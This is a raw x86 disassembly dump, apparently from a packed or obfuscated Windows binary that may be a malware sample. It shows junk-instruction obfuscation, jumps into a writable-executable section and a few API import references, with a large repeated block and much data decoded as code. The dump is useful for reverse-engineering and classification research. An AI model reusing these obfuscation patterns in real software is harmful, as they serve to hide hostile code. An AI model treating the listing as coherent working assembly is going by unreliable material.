jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_515e80
push 0x55a5fe2c
xchg [ esp + 0x2c ] esi
rcr si cl
lea esi [ edx * 8 + 0x4ed54e51 ]
bt bp 0xc
xor esi edx
mov esi edi
stc
stc
clc
jmp rwxdata
sub esi eax
pushfd
jmp rwxdata
jmp rwxdata
pushfd
[ edi ] [ esi ]
jmp rwxdata
movsx si dl
bswap si
mov [ esp + 0x4 ] sp
mov esi [ esp + 0x34 ]
pushfd
mov [ esp ] al
lea esp [ esp + 0x3c ]
jmp rwxdata
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
jmp rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_515f5a
pushfd
push 0x19717942
lea esp [ esp + 0x18 ]
je rwxdata
push eax
pushfd
add [ ebp - 0x4 ] 0x14
mov [ esp + 0x4 ] dh
pushad
mov [ esp + 0x4 ] al
push 0xcf7c7e7a
lea esp [ esp + 0x2c ]
jmp rwxdata
push 0xe67cfc8d
stc
bt eax edx
test eax 0x80000000
mov [ esp ] cl
lea esp [ esp + 0x4 ]
je rwxdata
sub dh 0xe4
mov edx [ ebp - 0x4 ]
bsf edi ebx
mov edi [ edx + 0x10 ]
stc
test al dl
bt cx di
test edi edi
push 0x37fec763
jmp rwxdata
call sub_5155d0
add [ eax ] al
inc ebx
push 0x65676e61
push ebx
jb rwxdata
call sub_514f5e
add [ eax ] al
pop edi
arpl [ edi + 0x6e ] bp
je rwxdata
jmp rwxdata
jb rwxdata
imul esp [ ebx + 0x65 ] 0x666e6f43
imul esp [ edi + 0x41 ] 0x10db6800
ror [ esi ] 0xe8
into
inc esi
add [ eax ] al
fidiv [ eax - 0x5a5cca7f ]
jae rwxdata
outsd
insb
jo rwxdata
lea esp [ esp + 0x4 ]
je rwxdata
insb
arpl [ gs : edi + ecx * 2 + 0x62 ] si
push 0x65
arpl [ eax + eax - 0x1a ] si
fnsave [ eax - 0xa ]
je rwxdata
outsb
add [ eax ] al
add [ ebx + 0x65 ] dl
jpe rwxdata
outsb
je rwxdata
or eax 0xa89893b9
xchg edx eax
pop edx
sub eax 0x65b207d
rol esp 0x1
add [ ebx + eax * 4 - 0x32b1e43a ] ah
push 0x44ed4ee1
cld
and [ eax - 0x503b2820 ] 0x14
cli
inc esi
pushfd
jmp rwxdata
rol bl cl
shrd ebx eax 0x16
sub eax eax
sete bl
movzx bx bl
not edi
bswap si
pop ebx
jmp rwxdata
shl si cl
cmp edx 0xee658727
add edi ebx
not si
rcl si cl
mov esi [ edx ]
call sub_516b27
div [ eax + ebp * 8 + 0x7a ]
sti
jg rwxdata
mov eax [ esi ]
add edx [ edx + 0x26 ]
retn
js rwxdata
lea esp [ esp + 0x24 ]
jne rwxdata
call sub_516af7
sub [ bp ] 0x65530000
push cs
call sub_519dcf
inc edx
in al dx
dec edx
insb
jl __import_dll_name(GDI32)
popfd
add ebp [ ebx - 0xf ]
inc ebx
cmp [ esi + 0x33 ] edi
dec ecx
adc cl [ eax + 0x5 ]
pushad
xor al 0x6c
and [ edx + 0x9 ] ebp
sub al 0x8d
and al 0xc
je rwxdata
inc ecx
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
jpe rwxdata
jmp rwxdata
inc edi
inc esp
dec ecx
xor esi [ edx ]
insb
insb
add [ eax ] al
add [ edi + 0x5f ] bl
inc ebx
js rwxdata
add edx [ ebp - 0x65 ]
xor eax 0xca192593
add bh al
mov [ cs : edi ] esp
shr bh cl
shl bx cl
push eax
mov bx [ esi ]
pushad
pushad
lea esp [ esp + 0x40 ]
jmp rwxdata
0xd66bf268 0x7d34
insd
jo rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
jmp rwxdata
sbb esi 0x4ef96057
inc esi
jb rwxdata
pushad
jmp rwxdata
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
cmp ax cx
setns bl
shrd bx si 0x8
push 0x5fb38d27
mov bx [ esi ]
pushfd
and ebx 0xfff
jmp rwxdata
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
mov ebx [ esi ]
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
stosb [ edi ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
jb rwxdata
insd
dec eax
popad
outsb
insb
jb rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata
test esi ebp
add [ edi + ebx ] ax
pushfd
push [ esp + 0x4 ]
push 0x7ff9b3ca
lea esp [ esp + 0x14 ]
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
